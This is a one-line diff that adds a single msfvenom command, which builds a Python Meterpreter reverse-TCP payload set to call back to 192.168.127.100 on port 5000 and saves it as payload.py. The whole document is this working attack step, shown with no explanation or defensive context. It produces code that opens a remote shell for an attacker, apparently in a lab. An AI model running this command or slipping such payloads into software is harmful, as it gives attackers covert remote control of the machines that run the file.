@@ -1,0 +1,1 @@
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.127.100 LPORT=5000 -f raw -o payload.py
